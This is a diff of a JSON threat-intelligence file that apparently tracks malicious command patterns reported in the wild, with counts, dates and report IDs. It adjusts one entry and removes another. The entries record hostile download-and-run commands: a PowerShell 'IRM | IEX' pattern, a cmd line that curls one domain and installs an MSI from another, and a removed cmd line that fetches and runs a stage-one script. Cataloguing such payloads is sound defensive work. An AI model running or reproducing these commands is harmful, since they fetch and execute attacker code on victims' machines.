@@ -517,11 +517,10 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 16,
-    "ReportCount": 150,
-    "FirstSeen": "2026-11-09T15:58:02.213000+00:00",
+    "ReportCount": 149,
+    "FirstSeen": "2026-11-09T17:20:47.752000+00:00",
     "LastSeen": "2026-11-16T09:40:35.633000+00:00",
     "ReportIds": [
-      "cmw9g3lxz00h00oml615sax5b",
       "cmw9j217600v80omls8fciut4",
       "cmw9sj86l05zm0omlpfcti0fc",
       "cmw9skaqb064e0omlfadn4wxj",
@@ -1134,19 +1133,6 @@
     ],
     "PayloadExamples": [
       "cmd /c \"curl -s -o NUL https://xedplay[.]com/verify.php?t=7fe13fa4dc9efc264de91e0508e89fb6 & msiexec /q /i https://distnode[.]biz/radar-cover-probe/named\""
-    ]
-  },
-  {
-    "Pattern": "cmd /c start /min cmd /c \"curl -sko %tmp%\\\\~u.cmd https://' + SCRIPTS_DOMAIN + '/u/stage1.cmd&%tmp%\\\\~u.cmd\"",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-09T15:57:14.031000+00:00",
-    "LastSeen": "2026-11-09T15:57:14.031000+00:00",
-    "ReportIds": [
-      "cmw9g2kme00et0omlszyw2f1j"
-    ],
-    "PayloadExamples": [
-      "cmd /c start /min cmd /c \"curl -sko %tmp%\\\\~u.cmd https://' + SCRIPTS_DOMAIN + '/u/stage1.cmd&%tmp%\\\\~u.cmd\""
     ]
   },
   {
